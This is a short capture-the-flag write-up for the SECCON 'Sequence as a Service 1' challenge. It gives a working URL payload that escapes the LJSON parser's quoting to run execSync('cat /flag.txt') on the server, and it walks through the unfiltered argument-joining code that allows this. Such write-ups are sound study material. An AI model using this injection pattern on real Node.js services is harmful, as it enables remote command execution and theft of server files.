## Sequence as a Service 1


#### payload
```
http://sequence-as-a-service-1.quals.seccon.jp:3000/api/getValue?n=6&sequence=(a,b)=>(a("%2b","1\\",",11)%2bglobal.process.mainModule.require('child_process').execSync('cat /flag.txt')}))//"))
```

#### analyze

```javascript
function LJSON_application(binders,scope){
                return function(){
                    var fn = LJSON_variable(binders,scope)();
                    if (fn === null)
                        return null;

                    var calls = P.many(P.between(
                        P.sequence([P.skipSpaces,P.chr("(")]),
                        P.intercalatedSpaced(LJSON_value(binders,scope), P.chr(",")),
                        P.sequence([P.chr(")"),P.skipSpaces])))();

                    return fn + calls.map(function(args){
                            return "("+args.join(",")+")";
                        }).join("");
                };
            };
```
Our input is finally returned through the LJSON_application function.

```javascript
calls.map(function(args){
                            return "("+args.join(",")+")";
                        }).join("");
```
Our input is parsed by LJSON parser and stored in an array in calls
But we can see that there is no filtering for our input.
So we can use the backslash to escape the quote and insert any code.

![image](https://user-images.githubusercontent.com/46442697/145703555-78949c27-e9e0-4184-8808-8249d1d3863e.png)

